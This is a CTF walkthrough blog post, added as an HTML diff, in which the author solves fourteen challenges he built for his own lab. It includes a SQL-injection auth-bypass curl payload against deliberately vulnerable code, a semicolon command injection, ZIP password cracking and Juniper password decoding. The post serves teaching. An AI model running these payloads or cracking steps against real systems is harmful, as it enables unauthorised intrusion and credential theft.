@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="Brandon James" />
+  <meta name="dcterms.date" content="2025-11-03" />
+  <title>NoCo Hackers 2023 CTF Walkthrough</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="shortcut icon" href="favicon.png">
+</head>
+<body>
+<div class="header">
+    <h1 class="site-title"><span class="site-title-dir">[root@localhost /]# </span>cyb3r.sh <span class=blink>▉</span>
+    </h1>
+    <div class="title-links">
+        <a href="index.html">index</a>
+        <a href="about.html">about</a>
+    </div>
+</div>
+<header id="title-block-header">
+<h1 class="title">NoCo Hackers 2023 CTF Walkthrough</h1>
+<p class="author">Brandon James</p>
+<p class="date">2025-11-03</p>
+</header>
+<p>Before I start writing challenges for the 2025 edition of the NoCo
+Hackers annual CTF, I wanted to look back at some of the challenges I’ve
+written in the past. 2023 was the first annual NoCo Hackers CTF (it was
+also the year NoCo Hackers was founded), in 2023 I was the sole
+contributor, so this also encompasses every challenge from that
+year.</p>
+<p>For the NoCo Hackers CTFs, my goal has to keep things fun,
+interesting and educational with a set of challenges that should be
+solvable by most participants.</p>
+<h1 id="overview">Overview</h1>
+<ul>
+<li><a href="#ctf-infrastructure">CTF Infrastructure</a> - The physical
+and virtual components that went into the CTF</li>
+<li><a href="#challenge-1-just-txt-me">Challenge #1 Just TXT Me</a> - A
+gimmie challenge</li>
+<li><a href="#challenge-2-invisible-ink">Challenge #2 Invisible Ink</a>
+- Another gimmie</li>
+<li><a href="#challenge-3-knock-to-open-the-path">Challenge #3 Knock to
+open the path</a> - Port knocking</li>
+<li><a href="#challenge-4-a-cve-to-find-you-see">Challenge #4 A CVE to
+Find You See</a> - A challenge built around a Mikrotik
+vulnerability</li>
+<li><a href="#challenge-5-breaking-and-entering">Challenge #5 Breaking
+and Entering</a> - An introduction to SSH tunnelling</li>
+<li><a href="#challenge-6-what-a-png">Challenge #6 What a PNG</a> - A
+basic steg challenge</li>
+<li><a href="#challenge-7-only-8-bits-eh">Challenge #7 Only 8-bits,
+eh?</a> - A slightly more complicated steg challenge</li>
+<li><a href="#challenge-8-noise-on-the-wire">Challenge #8 Noise on the
+Wire</a> - Extracting data from a pcap</li>
+<li><a href="#challenge-9-all-my-queries-are-belong-to-you">Challenge #9
+All my queries are belong to you</a> - SQL Injection</li>
+<li><a href="#challenge-10-rce-on-my-server-in-this-economy">Challenge
+#10 RCE?! On my server?! In this economy?!</a> - Command Injection</li>
+<li><a href="#challenge-11-thnks-fr-th-mmrs">Challenge #11 thnks fr th
+mmrs</a> - A reverse engineering challenge</li>
+<li><a href="#challenge-12-these-bytes-dont-lie">Challenge #12 These
+bytes don’t lie</a> - Data obfuscation</li>
+<li><a href="#challenge-13-john-lost-his-drive-ツ_">Challenge #13 John
+lost his drive ¯\_(ツ)_/¯</a> - A two in one cracking challenge</li>
+<li><a href="#challenge-14-ping-patterns">Challenge #14 Ping
+Patterns</a> - Steganography but with packets</li>
+</ul>
+<h1 id="ctf-infrastructure">CTF Infrastructure</h1>
+<p>The challenges were a mix of downloadable files and hosted
+challenges. All the hosted challenges ran as virtual machines on my home
+lab. The VMs used for the CTF were placed behind PfSense VMs configured
+to route all traffic through a wireguard tunnel provided by <a
+href="https://hoppy.network">hoppy.network</a>. In turn the VMs were
+connected to my host-isolated guest network.</p>
+<p><img src="media/2023_ctf_infra.png" title="Infra Diagram" /></p>
+<p>Physically, the lab consisted of some pretty basic hardware. Two
+proxmox hosts, one with an i5 3570K / 16GB RAM / 1TB storage and another
+with an i7 6700T / 32GB RAM / 1TB Storage. A physical Mikrotik RB3011
+(with a vulnerable version of RouterOS) and a Mikrotik css326-24g-2s+rm
+switch.</p>
+<p><img src="media/2023_ctf_hardware.jpg"
+title="Physical Hardware" /></p>
+<p>In addition to the self-hosted infrastructure, I also used a 1vCPU,
+1GB RAM digital ocean droplet to host <a
+href="https://ctfd.io/">CTFd</a>.</p>
+<h1 id="challenge-1-just-txt-me">Challenge #1 Just TXT Me</h1>
+<p>The first challenge was just a TXT record containing the flag</p>
+<pre><code>┌─(bjames@llpt03)-[~]
+└─$ dig TXT nocohackers.com +short
+&quot;v=spf1 include:spf.efwd.registrar-servers.com ~all&quot;
+&quot;flag{67856802eaa171df696813bcdd34f4b1}&quot;</code></pre>
+<h1 id="challenge-2-invisible-ink">Challenge #2 Invisible Ink</h1>
+<p>Description:</p>
+<blockquote>
+<p>There is a flag hidden somewhere on this website, can you find
+it?</p>
+<p>Scope: ctf.nocohackers.com</p>
+</blockquote>
+<p>The CTF’s site only had a few pages. I just stuck an invisible
+element in one of the pages:</p>
+<pre><code>&lt;p style=&quot;visibility: hidden&quot;&gt;flag{dba0787460c82a806bece8b0ba829054}&lt;/p&gt;</code></pre>
+<h1 id="challenge-3-knock-to-open-the-path">Challenge #3 Knock to open
+the path</h1>
+<p>Description:</p>
+<blockquote>
+<p>Travel back in time to find the key:</p>
+<p>The year the IMPs first spoke to each other.</p>
+<p>The birth year of the Grandmother of Computing.</p>
+<p>The year the world learned how to Smash the Stack for Fun and
+Profit.</p>
+<p>Scope: netchallenge.nocohackers.com</p>
+</blockquote>
+<p>The challenge title is a reference to port knocking. Port knocking is
+a technique used to prevent a port from being reachable until
+connections have been attempted on other ports. On my mikrotik rb3011,
+this configuration looks like the following:</p>
+<pre><code>add action=add-src-to-address-list address-list=1969 address-list-timeout=10s chain=input dst-port=1969 protocol=tcp
+
+add action=add-src-to-address-list address-list=port:1815 address-list-timeout=10s chain=input dst-port=1815 protocol=tcp src-address-list=port:1869
+
+add action=add-src-to-address-list address-list=secure address-list-timeout=1h chain=input dst-port=1996 log=yes protocol=tcp src-address-list=port:1815</code></pre>
+<ol type="1">
+<li>Attempting a connection on port 1969 (the year IMPs and ARPANET came
+online) puts you on a list opening access to port 1869 (The year Ada
+Lovelace was born).</li>
+<li>Attempting a connection on port 1869 puts you on a list opening up
+access to port 1996 (The year Aleph One wrote Smashing the Stack for Fun
+and Profit).</li>
+<li>Attempting a connection on port 1996 gives you access to
+netchallenge.nocohackers.com:80 where the flag is hosted.</li>
+</ol>
+<p>The easiest way to knock is to use Ncat.</p>
+<pre><code>┌─(bjames@llpt03)-[~]
+└─$ nc -w1 netchallenge.nocohackers.com 1969
+Ncat: TIMEOUT.
+┌─(bjames@llpt03)-[~]
+└─$ nc -w1 netchallenge.nocohackers.com 1815
+Ncat: TIMEOUT.
+┌─(bjames@llpt03)-[~]
+└─$ nc -w1 netchallenge.nocohackers.com 1996
+Ncat: Connection refused.
+┌─(bjames@llpt03)-[~]
+└─$ curl netchallenge.nocohackers.com -s | grep flag
+            &lt;p&gt;flag{591ea8da35bf2e407e1280bf1929f53e}&lt;/p&gt;</code></pre>
+<h1 id="challenge-4-a-cve-to-find-you-see">Challenge #4 A CVE to Find
+You See</h1>
+<p>Description:</p>
+<blockquote>
+<p>Solving “Knock and the path will open” is a prerequisite to this
+challenge. Once you have access to the administrative ports of the
+router, there is a way in and it doesn’t involve credential stuffing.
+The exploit itself will make the flag visible, as well as some
+username/password combinations. Note that the admin access can only
+login from a specific IP. You’ll need to proceed using the lower
+privilege account, admin access to the router is not required for any
+challenges in this CTF.</p>
+</blockquote>
+<p>netchallenge.nocohackers.com:80 is the web config page for the
+Mikrotik rb3011. This page tells us the router is running RouterOS 6.30.
+A quick web search yields CVE-2018-14847, along with PoCs such as <a
+href="https://github.com/BasuCert/WinboxPoC">this one</a> (running
+random PoCs from the internet is generally ill advised, but this one is
+legit).</p>
+<p>Running the PoC outputs a list of username and password combinations.
+One of which contains a flag.</p>
+<h1 id="challenge-5-breaking-and-entering">Challenge #5 Breaking and
+Entering</h1>
+<p>Description:</p>
+<blockquote>
+<p>This flag requires first completing “Knock to open the path” and “A
+CVE to find, you see”. The flag exists on a webserver behind the router.
+Can you find a way to steal it?</p>
+</blockquote>
+<p>This challenge can be solved with port forwarding.</p>
+<pre><code>ssh user@netchallenge.nocohackers.com -L 8080:192.168.88.10:80 -N  -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa</code></pre>
+<ul>
+<li><code>-L</code> forward requests on localhost:8080 to
+192.168.88.10:80 via the SSH connection</li>
+<li><code>-N</code> don’t spawn a shell on the remote host</li>
+<li><code>-oHostKeyAlgorithms=+ssh-rsa</code> allow use of ssh-rsa</li>
+<li><code>-oPubKeyAcceptedAlgorithms=+ssh-rsa</code> accept the use of
+ssh-rsa</li>
+</ul>
+<p>The webserver itself can be found by checking ARP tables on the
+mikrotik or reading the config and ping sweeping the LAN</p>
+<p>Once we start forwarding requests to 192.168.88.10:80 we can retrieve
+the flag via cURL:</p>
+<pre><code>┌─(bjames@llpt03)-[~]
+└─$ curl localhost:8080 -s | grep flag
+      &lt;h1&gt;&lt;strong&gt;flag{71e221acdcc451ecf79ef8edf0d95dbf}&lt;/strong&gt;&lt;/h1&gt;</code></pre>
+<h1 id="challenge-6-what-a-png">Challenge #6 What a PNG</h1>
+<p>Description:</p>
+<blockquote>
+<p>The flag is hidden in the attached image. Good luck!</p>
+</blockquote>
+<p>The image from the challenge can be found <a
+href="https://github.com/bjames/2023NoCoHackersHolidayCTF/blob/main/steg/whatapng.png">here</a>.
+In the case of this challenge, the flag is just hidden in the last few
+bytes of the image. Since PNG files use a trailer to denote the end of
+image data, this doesn’t impact how the image is rendered.</p>
+<pre><code>┌─(bjames@llpt03)-[~/Downloads]
+└─$ hexdump -C whatapng.png | tail
+001c06b0  3b 10 81 e7 00 00 ed 91  76 c5 cf f9 5d 06 80 a5  |;.......v...]...|
+001c06c0  c2 c6 3e cf 78 bf 5d 28  72 5d b1 8f d6 fb db 15  |..&gt;.x.](r]......|
+001c06d0  86 58 cf ae 04 da 43 be  fc ee fa 8b 30 6f 63 48  |.X....C.....0ocH|
+001c06e0  f5 92 b8 0e 80 6b ed f2  b3 5d 15 c2 a6 28 9b 6b  |.....k...]...(.k|
+001c06f0  d2 d5 71 2a 10 a7 98 0e  a3 0c 80 ff 07 99 07 30  |..q*...........0|
+001c0700  aa 1a bc 5f 1e 00 00 00  00 49 45 4e 44 ae 42 60  |..._.....IEND.B`|
+001c0710  82 66 6c 61 67 7b 66 65  31 33 35 63 63 63 66 62  |.flag{fe135cccfb|
+001c0720  62 30 63 39 66 37 30 36  30 34 64 65 63 35 66 65  |b0c9f70604dec5fe|
+001c0730  34 39 32 32 33 37 7d                              |492237}|
+001c0737</code></pre>
+<h1 id="challenge-7-only-8-bits-eh">Challenge #7 Only 8-bits, eh?</h1>
+<p>Description</p>
+<blockquote>
+<p>I hope you know your way around <a
+href="https://www.gimp.org/">GIMP</a> better than I do. The flag is in
+the attached image.</p>
+</blockquote>
+<p>The image for this challenge was created with the following process:
+1. Image was converted to 255 colors via GIMP 2. Image &gt; Mode &gt;
+Indexed 3. Generated a QR code containing the flag using qrencode 4.
+Used color picker to select one of the darker areas of the image 5. Used
+bucket fill to make the QR code a slightly different color 6.
+Pasted/rotated the QR code</p>
+<p>One way to retrieve the QR code is using GIMP as shown below:</p>
+<p><video src="media/only8bits.webm" title="GIMP QR Code Recovery"
+controls=""><a href="media/only8bits.webm">Video</a></video></p>
+<h1 id="challenge-8-noise-on-the-wire">Challenge #8 Noise on the
+Wire</h1>
+<p>Description</p>
+<blockquote>
+<p>You’ve managed to sniff some packets, there is a flag inside. Can you
+find it?</p>
+</blockquote>
+<p>For this challenge, I created a bunch of random files using a <a
+href="https://github.com/bjames/2023NoCoHackersHolidayCTF/blob/main/noise/filegen.sh">bash
+script</a>. In plain english it:</p>
+<ol type="1">
+<li>Creates random file names from
+<code>/usr/dict/share/words</code></li>
+<li>Creates empty photos and appends random data to give them non-zero
+sizes</li>
+<li>Creates plaintext files using <code>fortune</code></li>
+<li>Compresses all the files with gzip</li>
+</ol>
+<p>Then I manually add a flag to one of the images using gimp and
+transferred the files via Python SimpleHTTPServer while taking a packet
+capture</p>
+<p>Solving this can be done as follows:</p>
+<ol type="1">
+<li>Use wireshark to extract all files from the PCAP (File -&gt; Export
+Objects)</li>
+<li>Extract all files from pcap: gunzip -r .</li>
+<li>Notice there are three types of files: Photos, binaries and
+plaintext</li>
+<li>Search all files for “flag”: <code>grep -ra flag{ ./</code> (-r
+searches recursively, -a treats binary files as plaintext)</li>
+<li>Note that no strings contained in the files match</li>
+<li>Focus search on only the photos</li>
+<li>Eventually find the flag in the file called “marbleizing”</li>
+</ol>
+<h1 id="challenge-9-all-my-queries-are-belong-to-you">Challenge #9 All
+my queries are belong to you</h1>
+<p><img src="media/all_my_queries.png"
+title="all my queries challenge page" /></p>
+<p>This challenge is a pretty vanilla SQLinjecton to auth bypass. The
+webpage has input validation, but only on the client side. Using curl
+allows auth bypass. The vulnerable code is copied below (full source
+available <a
+href="https://github.com/bjames/2023NoCoHackersHolidayCTF/tree/main/web/it_dashboard">here</a>):</p>
+<pre><code>def check_password(username, password) -&gt; str | None:
+    &quot;&quot;&quot;
+    Check if the given username/password combination is valid.
+
+    This function is purposely vulnerable to SQL injection.
+    &quot;&quot;&quot;
+    conn = sqlite3.connect(f&quot;file:{DB_FILE}?mode=ro&quot;, uri=True) # open the database in read-only mode
+    c = conn.cursor()
+    c.execute(f&quot;SELECT * FROM users WHERE username=&#39;{username}&#39; AND password=&#39;{password}&#39;&quot;)
+    result = c.fetchone()
+    print(result)
+    conn.close()
+
+    return result</code></pre>
+<p>Specifically:
+<code>curl 'http://webchallenge.nocohackers.com/login' -X POST --data-raw "username=' OR '1'='1&amp;password=' OR '1'='1" -c -</code>
+causes our database query to become:</p>
+<pre><code>SELECT 
+    * 
+FROM users 
+WHERE 
+    username=&#39;&#39; OR &#39;1&#39;=&#39;1&#39; AND password=&#39;&#39; OR &#39;1&#39;=&#39;1&#39;</code></pre>
+<p>Which matches all rows due to the injected <code>OR '1'='1'</code>s.
+In return, we get a session cookie for the user “Alice”.</p>
+<p><video src="media/sql.webm" title="Example video" controls=""><a
+href="media/sql.webm">Video</a></video></p>
+<h1 id="challenge-10-rce-on-my-server-in-this-economy">Challenge #10
+RCE?! On my server?! In this economy?!</h1>
+<p>Once you’ve gained access to the IT dashboard in “All my queries are
+belong to you”, you’re greeted with a page containing a pretty basic
+command injection vulnerability.</p>
+<p><img src="media/rce_on_my_server.png" title="IT Dashboard" /></p>
+<p>In this case, the flag is quite easy to find once you have RCE.
+Interacting with the dashboard, it becomes very apparent that we are
+executing <a
+href="https://github.com/bjames/2023NoCoHackersHolidayCTF/blob/main/web/it_dashboard/project/modules/dashboard_scripts.py">shell
+commands</a> based on user input. All that is needed to execute code on
+the system is to add a <code>;</code> then the command you want to
+run.</p>
+<pre><code>[bjames@llpt01 ~]$ curl &#39;http://webchallenge.nocohackers.com/ping&#39; -X POST -H &#39;Cookie: noco_hackers_2023_session=cb6a9e9ff9d79cf3665eaab34c3f63c4ee760282261e9a59041e08441a605b72&#39; --data-raw &#39;host=8.8.8.8;ls&#39;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;
+        &lt;title&gt;Login&lt;/title&gt;
+        &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;h1&gt;IT Dashboard&lt;/h1&gt;
+
+        &lt;pre class=&quot;code&quot;&gt;PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=34.3 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=33.9 ms
+64 bytes from 8.8.8.8: icmp_seq=3 ttl=111 time=35.0 ms
+64 bytes from 8.8.8.8: icmp_seq=4 ttl=111 time=35.4 ms
+
+--- 8.8.8.8 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3006ms
+rtt min/avg/max/mdev = 33.862/34.616/35.383/0.591 ms
+Dockerfile
+docker-compose.yml
+flag{d76bebbf741d89109db22e492196c04}
+nginx
+project
+requirements.txt
+session.db
+user.db
+wsgi.py</code></pre>
+<h1 id="challenge-11-thnks-fr-th-mmrs">Challenge #11 thnks fr th
+mmrs</h1>
+<p>Description:</p>
+<blockquote>
+<p>The attached x86_64 ELF binary is a subnet calculator. Can you
+extract the flag contained within?</p>
+</blockquote>
+<p>Two relevant functions are copied below (full source <a
+href="https://github.com/bjames/2023NoCoHackersHolidayCTF/blob/main/binary/subnet.c">here</a>):</p>
+<pre><code>void bunniesArentJustCuteLikeEverybodySupposes(char *obfuscatedFlag, int length, char key) {
+
+    char a[] = &quot;They&#39;ve got them hoppy legs and twitchy little noses!&quot;;
+    char b[] = &quot;And what&#39;s with all the carrots?&quot;;
+    char c[] = &quot;What do they need such good eyesight for anyway?&quot;;
+    char d[] = &quot;Bunnies, bunnies!&quot;;
+    char e[] = &quot;It must be bunnies!&quot;;
+
+    for (int i = 0; i &lt; length; i++) {
+        obfuscatedFlag[i] ^= key;  // XOR again with the same key to get original character
+    }
+}
+
+int main(int argc, char ** argv){
+
+  // flag{4722850fba3f38a317857d608888802b}
+  char obfuscatedFlag[] = {0xcc, 0xc6, 0xcb, 0xcd, 0xd1, 0x9e, 0x9d, 0x98, 0x98, 0x92, 0x9f, 0x9a, 0xcc, 0xc8, 0xcb, 0x99, 0xcc, 0x99, 0x92, 0xcb, 0x99, 0x9b, 0x9d, 0x92, 0x9f, 0x9d, 0xce, 0x9c, 0x9a, 0x92, 0x92, 0x92, 0x92, 0x92, 0x9a, 0x98, 0xc8, 0xd7, 0xaa, 0x0a};
+  int length = sizeof(obfuscatedFlag) / sizeof(obfuscatedFlag[0]);
+
+  bunniesArentJustCuteLikeEverybodySupposes(obfuscatedFlag, length, 0xAA);</code></pre>
+<p>This fairly simple reversing challenge can be solved with either
+static or dynamic analysis. In the video below we see how to solve it
+using <a href="https://github.com/pwndbg/pwndbg/">pwndbg</a>.</p>
+<p><video src="media/thnksfrthmmrs.webm" title="pwndbg example"
+controls=""><a href="media/thnksfrthmmrs.webm">Video</a></video></p>
+<h1 id="challenge-12-these-bytes-dont-lie">Challenge #12 These bytes
+don’t lie</h1>
+<p>Description:</p>
+<blockquote>
+<p>This flag was “encrypted” in a weak manner. The bytes output from the
+encryption program follow.</p>
+<p>0x080302081356075a064a43080e53595d515b5c5c16465d5a05595d55520f0441475957070a15</p>
+<p>Can you decipher it?</p>
+</blockquote>
+<p>We know flags always start with “flag{“ and end with “}”. We also
+know XORing is a common obfuscation method. XOR is defined as a bitwise
+OR where the output is only “1” if the input is unequal. A truth table
+follows:</p>
+<table>
+<thead>
+<tr class="header">
+<th>A</th>
+<th>B</th>
+<th>A∨B</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>0</td>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr class="even">
+<td>0</td>
+<td>1</td>
+<td>1</td>
+</tr>
+<tr class="odd">
+<td>1</td>
+<td>0</td>
+<td>1</td>
+</tr>
+<tr class="even">
+<td>1</td>
+<td>1</td>
+<td>0</td>
+</tr>
+</tbody>
+</table>
+<p>Looking at this you can see that XOR’ing input A against the output
+will yield input B.</p>
+<table>
+<thead>
+<tr class="header">
+<th>input</th>
+<th>mask</th>
+<th>input ∨ mask</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>0x08</td>
+<td>0x66 (ascii f)</td>
+<td>0x6e (ascii n)</td>
+</tr>
+<tr class="even">
+<td>0x03</td>
+<td>0x6c (ascii l)</td>
+<td>0x6f (ascii o)</td>
+</tr>
+<tr class="odd">
+<td>0x02</td>
+<td>0x61 (ascii a)</td>
+<td>0x63 (ascii c)</td>
+</tr>
+<tr class="even">
+<td>0x08</td>
+<td>0x67 (ascii g)</td>
+<td>0x6f (ascii o)</td>
+</tr>
+<tr class="odd">
+<td>0x13</td>
+<td>0x7b (ascii {)</td>
+<td>0x68 (ascii h)</td>
+</tr>
+</tbody>
+</table>
+<p>From this we can guess the key is <code>nocohackers</code> repeated
+for the entirety of the key.</p>
+<h1 id="challenge-13-john-lost-his-drive-_ツ_">Challenge #13 John lost
+his drive ¯\_(ツ)_/¯</h1>
+<p>Description:</p>
+<blockquote>
+<p>You found a flash drive labeled “John - IT”. It’s got a single ZIP
+archive on it, password protected so it probably contains something
+good.</p>
+</blockquote>
+<p><em>Note: if you want to follow along, the archive can be found <a
+href="https://github.com/bjames/2023NoCoHackersHolidayCTF/blob/main/found_drive/work_stuff.zip">here</a></em></p>
+<p>This is a multipart challenge. To find the flag we must:</p>
+<ol type="1">
+<li>Crack the ZIP archive</li>
+<li>Reverse the 2nd Juniper type 9 password found in the JunOS base
+config file</li>
+</ol>
+<h2 id="part-1-cracking-the-zip-archive">Part 1 Cracking the ZIP
+archive</h2>
+<p>I used <a href="https://www.openwall.com/john/">JTR</a>, but <a
+href="https://hashcat.net/hashcat/">hashcat</a> would also work.</p>
+<ol type="1">
+<li>Use zip2john to generate hashes for john to crack</li>
+<li>Crack the hashes using john</li>
+</ol>
+<pre><code>[bjames@llpt01 work_stuff_working]$ zip2john work_stuff.zip &gt; work_stuff.hash
+[bjames@llpt01 work_stuff_working]$ ~/john/run/john work_stuff.hash
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Loaded hashes with cost 1 (HMAC size) varying from 784 to 403727
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press &#39;q&#39; or Ctrl-C to abort, &#39;h&#39; for help, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+0g 0:00:00:13 DONE 1/3 (2023-12-14 09:58) 0g/s 33502p/s 33503c/s 33503C/s Chili1900..Md1900
+Proceeding with wordlist:/home/bjames/john/run/password.lst
+Enabling duplicate candidate password suppressor
+colorado1!       (work_stuff.zip/trap_card.png)
+colorado1!       (work_stuff.zip/base_config_ios.txt)
+colorado1!       (work_stuff.zip/base_config_junos.txt)
+colorado1!       (work_stuff.zip/vegan_rocky_mountain_chili.md)
+colorado1!       (work_stuff.zip/base_config_ios_xr.txt)
+colorado1!       (work_stuff.zip/rocky_mountain_chili.md)
+6g 0:00:03:49 DONE 2/3 (2023-12-14 10:02) 0g/s 7307p/s 33861c/s 33861C/s mikeyq..yours4eva
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+[bjames@llpt01 work_stuff_working]$</code></pre>
+<h2 id="part-2-cracking-the-junos-type-9-password">Part 2 Cracking the
+JunOS Type 9 Password</h2>
+<p>base_config_ios.txt and base_config_junos.txt both contain passwords
+obfuscated with a Vigenere cipher. This cipher has been broken since <a
+href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">at least
+1863</a> and Cisco has been aware of tools to reverse them since <a
+href="https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/107614-64.html">at
+least 1995</a>. The vulnerable password types are:</p>
+<ul>
+<li>Cisco Type 7</li>
+<li>Juniper Type 9</li>
+</ul>
+<p>There are websites and tools that can do this for you (especially in
+the case of Cisco Type 7). Although last time I tried the obvious result
+for JunOS Type 9 it didn’t work, so I found and forked a Python2.7
+decoder and updated it for Python3. The original is <a
+href="https://github.com/mhite/junosdecode">here</a> and the Python3
+fork is <a href="https://github.com/bjames/junosdecode">here</a>.</p>
+<pre><code>┌─(bjames@llpt03)-[~/Downloads] 
+└─$ python3 junosdecode.py &#39;$9$9Rgxtu1MWxN-w1R4ZGjq.z369O1ylKXxd9A7-bwg45QzFAp0BIEhr.PO1Rhrl24oGHqQz6uBIjHmTFnCAKMWXxdYgojk.aJFn6/tp7-dw4aZUjmT3&#39;
+junos password decrypter
+Original python 2.7 version by matt hite
+lazily converted to python 3 by Brandon James
+original perl version by kevin brintnall
+
+encrypted version: $9$9Rgxtu1MWxN-w1R4ZGjq.z369O1ylKXxd9A7-bwg45QzFAp0BIEhr.PO1Rhrl24oGHqQz6uBIjHmTFnCAKMWXxdYgojk.aJFn6/tp7-dw4aZUjmT3
+$9$9Rgxtu1MWxN-w1R4ZGjq.z369O1ylKXxd9A7-bwg45QzFAp0BIEhr.PO1Rhrl24oGHqQz6uBIjHmTFnCAKMWXxdYgojk.aJFn6/tp7-dw4aZUjmT3
+decrypted version: flag{8f96ea92081ab1523f6dc61b46510721</code></pre>
+<h1 id="challenge-14-ping-patterns">Challenge #14 Ping Patterns</h1>
+<p>Description</p>
+<blockquote>
+<p>Putting the M in ICMP Scope: webchallenge.nocohackers.com</p>
+</blockquote>
+<p>This was based loosely on a data exfil toy I wrote called <a
+href="https://github.com/bjames/absurd_icmp">“absurd ICMP”</a> (I should
+do a post on this, it’s neat). Absurd ICMP shoves data into ICMP’s
+2-byte sequence field. In the case of Absurd ICMP the data is encoded in
+the echo requests coming from the client, so the behavior is a bit
+different. In this challenge, the server ignores the sequence numbers
+sent by the client and responds with something completely different.</p>
+<p><img src="media/ping_patterns.png" title="ping output" /></p>
+<p>Upon pinging webchallenge.nocohackers.com, it is pretty apparent that
+something is going on with the sequence numbers. A tool like ngrep can
+be used to visualize the contents a little better.</p>
+<p><video src="media/ngrep_ping_patterns.webm"
+title="ngrep ping patterns" controls=""><a
+href="media/ngrep_ping_patterns.webm">Video</a></video></p>
+<p>Using a similar technique to the one described in challenge #12, you
+can discover the data is obfuscated by XORing the sequence number with
+the leftmost bytes of the ICMP payload. An example decoder can be found
+<a
+href="https://github.com/bjames/2023NoCoHackersHolidayCTF/blob/main/ICMP/decoder.py">here</a>.</p>
+<p><video src="media/ping_patterns_decode.webm"
+title="ping patterns decoder" controls=""><a
+href="media/ping_patterns_decode.webm">Video</a></video></p>
+<div class="footer">
+    <p>
+        <a href="mailto:brandon@cyb3r.sh">🖂 brandon@cyb3r.sh</a>
+    </p>
+    <p>
+        <a href="https://github.com/bjames">github</a> <a href="https://bsky.app/profile/cyb3r.sh">bluesky</a> <a
+            href="https://www.strava.com/athletes/8443527">strava</a>
+        <a href="https://www.linkedin.com/in/brandonsjames/">linkedin</a>
+    </p>
+</div>
+</body>
+</html>
